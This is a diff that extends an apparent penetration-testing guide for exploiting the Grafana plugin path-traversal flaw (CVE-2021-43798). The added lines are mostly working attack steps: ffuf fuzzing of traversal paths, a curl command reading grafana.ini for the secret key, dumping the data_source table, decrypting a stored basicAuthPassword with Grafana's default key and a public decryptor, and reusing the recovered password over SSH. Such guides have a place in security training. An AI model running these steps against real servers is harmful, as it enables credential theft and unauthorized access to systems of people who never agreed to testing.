@@ -143,6 +143,13 @@ curl --path-as-is "http://TARGET:3000/public/plugins/piechart/../../../../../../
 /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 ```
 
+Fuzz for high-value file paths through the plugin traversal:
+
+```bash
+ffuf -X 'GET' -H 'Host: TARGET:3000' -u 'http://TARGET:3000/public/plugins/piechart/../../../../../../../../../../../..FUZZ' -w /md/wl/lfi-fullpath-nix.txt -fw 5 -fc 500
+ffuf -X 'GET' -H 'Host: TARGET:3000' -u 'http://TARGET:3000/public/plugins/piechart/../../../../../../../../../../../..FUZZ' -w /md/wl/list.txt -fw 5 -fc 500
+```
+
 ### High-Value Files to Target
 
 ```bash
@@ -276,6 +283,60 @@ Grafana often connects to databases. Check data_source table:
 ```sql
 SELECT * FROM data_source;
 -- May contain MySQL, PostgreSQL, InfluxDB credentials
+```
+
+If `secure_json_data` contains an encrypted value such as `basicAuthPassword`, decrypt it with Grafana's `secret_key` from `grafana.ini`.
+
+Get the secret key via LFI:
+
+```bash
+curl --path-as-is "http://TARGET:3000/public/plugins/piechart/../../../../../../../../../../../../etc/grafana/grafana.ini"
+```
+
+Look for:
+
+```ini
+[security]
+;secret_key = SW2YcwTIb9zpOOhoPsMm
+```
+
+Query the data source table:
+
+```sql
+select * from data_source;
+```
+
+Observed useful fields:
+
+```text
+url: http://localhost:9090
+user: sysadmin
+secure_json_data: {"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}
+```
+
+Use a Grafana datasource decryptor and set:
+
+```text
+https://github.com/jas502n/Grafana-CVE-2021-43798.git
+```
+
+The grafanaIni_secretKey is found in `/etc/grafana/grafana.ini` file
+Below is the default key if you dont know yours. Its possible to change this value in custom installs
+```go
+var grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"
+var dataSourcePassword = "anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="
+```
+
+Expected output:
+
+```text
+[*] plainText= SuperSecureP@ssw0rd
+```
+
+Then try the recovered data source credential over SSH if it matches a local user:
+
+```bash
+ssh sysadmin@TARGET
 ```
 
 ### API Keys
